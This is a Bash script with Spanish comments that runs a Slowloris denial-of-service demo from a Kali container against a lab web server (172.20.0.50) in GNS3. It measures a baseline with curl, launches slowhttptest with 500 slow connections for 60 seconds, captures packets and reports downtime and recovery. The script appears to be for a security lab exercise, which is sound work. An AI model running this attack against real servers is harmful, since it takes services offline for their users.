#!/usr/bin/env bash
# Demo no-interactiva: botar bt-web (172.20.0.50) con Slowloris desde Kali.
# Pensada para ejecutarse vía `docker exec -i GNS3.Kali-Attacker.<pid> bash < este.sh`
# o desde la consola del Kali en GNS3. Captura baseline, lanza el monitor en
# segundo plano, ejecuta Slowloris 60s y verifica la recuperacion del servicio.
set -uo pipefail
source /root/scripts/lib/common.sh

TARGET="${BT_WEB:-172.20.0.50}"
PORT=80
URL="http://${TARGET}:${PORT}/"
EVIDENCE_DIR=$(init_evidence_dir "phase-6-dos-btweb")
echo "$EVIDENCE_DIR" > /tmp/dos-evidence-dir
export EVIDENCE_DIR

banner "DEMO DoS — Slowloris contra bt-web (${TARGET})"

# ── 1. Baseline corto (10 muestras) ──────────────────────────────────────────
log INFO "Baseline 10s contra ${URL}"
{
    echo "timestamp,http_code,time_total"
    for i in $(seq 1 10); do
        TS=$(date +%H:%M:%S)
        OUT=$(curl -s -o /dev/null -w '%{http_code},%{time_total}' --max-time 5 "$URL" 2>&1 || echo "000,5.000")
        echo "${TS},${OUT}"
        sleep 1
    done
} > "${EVIDENCE_DIR}/baseline-curl.csv"
log INFO "Baseline: $(tail -1 "${EVIDENCE_DIR}/baseline-curl.csv")"

# ── 2. Monitor en segundo plano (90s) ────────────────────────────────────────
MON="${EVIDENCE_DIR}/monitor.csv"
echo "timestamp,http_code,time_total" > "$MON"
(
    END=$(( $(date +%s) + 90 ))
    while [ "$(date +%s)" -lt "$END" ]; do
        TS=$(date +%H:%M:%S)
        OUT=$(curl -s -o /dev/null -w '%{http_code},%{time_total}' --max-time 3 "$URL" 2>&1 || echo "000,3.000")
        echo "${TS},${OUT}" >> "$MON"
        sleep 1
    done
) &
MON_PID=$!
log INFO "Monitor en background (PID ${MON_PID}) -> ${MON}"

# ── 3. Captura pcap + Slowloris 60s ──────────────────────────────────────────
tcpdump -i eth0 -w "${EVIDENCE_DIR}/slowloris.pcap" "host ${TARGET} and port ${PORT}" >/dev/null 2>&1 &
TCPDUMP_PID=$!
sleep 3   # dejar que el monitor capture baseline 200 antes del golpe

log WARN "Lanzando Slowloris: 500 conexiones lentas durante 60s..."
slowhttptest -c 500 -H -i 10 -r 200 -t GET -u "$URL" -x 24 -p 3 -l 60 -g \
    -o "${EVIDENCE_DIR}/slowloris-report" > "${EVIDENCE_DIR}/slowloris.log" 2>&1

kill "$TCPDUMP_PID" 2>/dev/null || true
log INFO "Slowloris finalizado."

# ── 4. Recuperacion ──────────────────────────────────────────────────────────
log INFO "Esperando recuperacion del servicio (15s)..."
sleep 15
RECOVER=$(curl -s -o /dev/null -w '%{http_code} en %{time_total}s' --max-time 5 "$URL" 2>&1 || echo "000 timeout")
log INFO "Post-ataque: ${RECOVER}"

wait "$MON_PID" 2>/dev/null || true

# ── 5. Resumen del impacto ───────────────────────────────────────────────────
echo ""
echo "================ RESUMEN DE IMPACTO ================"
TOTAL=$(($(wc -l < "$MON") - 1))
DOWN=$(tail -n +2 "$MON" | awk -F, '$2!="200"' | wc -l)
OK=$(tail -n +2 "$MON" | awk -F, '$2=="200"' | wc -l)
echo "Target            : ${TARGET}:${PORT} (bt-web / Apache2, MaxWorkers=20)"
echo "Muestras monitor  : ${TOTAL}"
echo "  Respuestas 200  : ${OK}"
echo "  Caidas (!=200)  : ${DOWN}"
echo "Recuperacion final: ${RECOVER}"
echo "Evidencia en      : ${EVIDENCE_DIR}"
echo "==================================================="
echo ""
echo "--- Línea de tiempo (http_code por segundo) ---"
tail -n +2 "$MON" | awk -F, '{printf "%s %s\n", $1, $2}' | uniq -c -f1 | awk '{print "  "$2"  code="$3"  (x"$1")"}'
